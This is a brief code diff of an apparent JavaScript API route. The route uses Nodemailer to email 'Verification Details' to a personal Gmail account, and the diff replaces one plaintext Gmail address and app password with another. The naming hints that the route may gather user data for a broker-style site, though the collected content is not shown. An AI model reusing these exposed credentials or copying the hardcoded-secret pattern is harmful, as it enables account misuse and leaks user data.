@@ -9,10 +9,11 @@ export async function POST(request) {
 
   // Create a Nodemailer transporter
   const transporter = nodemailer.createTransport({
+    // Transport configuration
     service: "gmail",
     auth: {
-      user: "osr.cty@gmail.com",
-      pass: "btzbcklyxerxvkiy",
+      user: "bitrustbroker@gmail.com",
+      pass: "rchd qeld jrgv auwm",
     },
   });
 
@@ -87,8 +88,8 @@ export async function POST(request) {
 
   // Email options
   const mailOptions = {
-    from: "osr.cty@gmail.com",
-    to: "samsonrichfield@gmail.com",
+    from: "support@bitrust.pro",
+    to: "bitrustbroker@gmail.com",
     subject: "Verification Details",
     html: emailContent,
   };
